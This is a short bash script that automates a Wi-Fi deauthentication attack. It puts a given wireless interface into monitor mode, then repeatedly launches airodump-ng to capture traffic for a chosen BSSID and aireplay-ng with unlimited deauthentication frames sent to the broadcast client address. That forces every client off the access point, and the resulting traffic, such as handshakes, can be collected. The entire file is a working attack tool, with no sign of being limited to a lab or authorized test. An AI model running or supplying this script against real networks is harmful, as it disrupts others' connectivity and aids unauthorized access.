#!/bin/bash

set -e

# Get wireless interface, channel, and BSSID from command line arguments
interface=$1
channel=$2
bssid=$3

# Check if the required arguments have been provided
if [[ -z "$interface" || -z "$channel" || -z "$bssid" ]]; then
  echo "Error: Please provide the wireless interface, channel, and BSSID as command line arguments."
  exit 1
fi

# Start the wireless interface in monitor mode
echo "Starting wireless interface in monitor mode..."
airmon-ng start $interface || { echo "Error starting wireless interface in monitor mode. Exiting."; exit 1; }

# Handle the SIGINT signal to stop the wireless interface in monitor mode
trap "airmon-ng stop $interface && kill 0" SIGINT

# Run the airodump-ng and aireplay-ng commands in a while loop
while true; do
  echo "Capturing wireless traffic on channel $channel and BSSID $bssid..."
  xterm -e "airodump-ng $interface --channel $channel --bssid $bssid" &
  xterm -e "aireplay-ng --deauth 0 -a $bssid -c FF:FF:FF:FF:FF:FF $interface" &
  wait

  # Check if the user wants to stop the script
  read -p "Press Enter to capture more traffic or 'q' to quit: " choice
  if [[ "$choice" == "q" ]]; then
    break
  fi
done

echo "Exiting..."
